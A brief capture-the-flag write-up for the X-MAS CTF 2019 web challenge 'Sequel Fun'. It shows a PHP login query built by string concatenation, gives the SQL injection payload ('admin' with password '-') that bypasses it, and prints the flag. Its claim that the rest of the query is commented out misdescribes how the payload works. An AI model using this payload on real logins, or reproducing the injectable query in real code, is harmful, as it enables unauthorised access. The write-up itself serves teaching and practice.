# X-MAS CTF 2019 – Sequel Fun

* **Category:** Web
* **Points:** 25

## Challenge

> So I found this login page, but I forgot the credentials :(<br>
 $result = mysqli_query ($conn, "SELECT * FROM users WHERE user='" . $user . "' AND pass='" . $pass . "'", MYSQLI_STORE_RESULT);<br>
(The query has to return atleast a row, that was the condition)
## Solution

username = **admin**<br>
password = **'-'**<br>
These would result in the following query<br>
SELECT * FROM users WHERE user='admin' AND pass=''-''<br> (Password is empty, rest is commented out)<br>

This yields the flag.

```
X-MAS{S0_1_c4n_b3_4dmin_w1th0ut_7h3_p4ssw0rd?}
```
